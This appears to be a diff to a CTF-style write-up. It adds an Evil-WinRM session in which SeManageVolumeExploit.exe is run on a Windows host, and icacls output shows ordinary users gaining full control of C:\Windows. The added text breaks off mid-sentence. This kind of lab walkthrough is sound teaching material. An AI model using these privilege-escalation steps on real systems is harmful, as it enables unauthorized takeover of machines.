@@ -770,8 +770,37 @@ https://github.com/CsEnox/SeManageVolumeExploit/releases
 Ill start by uploading the exploit
 
 ```python
+*Evil-WinRM* PS C:\Users\Ryan.K\Desktop> .\SeManageVolumeExploit.exe
+Entries changed: 875
 
+DONE
+
+*Evil-WinRM* PS C:\Users\Ryan.K\Desktop>
 ```
+
+Ill upload it using evil winrm native upload feature then run it
+
+```python
+*Evil-WinRM* PS C:\Users\Ryan.K\Desktop> icacls C:\Windows
+C:\Windows NT SERVICE\TrustedInstaller:(F)
+           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+           NT AUTHORITY\SYSTEM:(M)
+           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+           BUILTIN\Users:(M)
+           BUILTIN\Users:(OI)(CI)(IO)(F)
+           BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
+           BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
+           CREATOR OWNER:(OI)(CI)(IO)(F)
+           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
+           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
+           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
+           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+*Evil-WinRM* PS C:\Users\Ryan.K\Desktop> 
+```
+
+Regular users now 
 
 
 
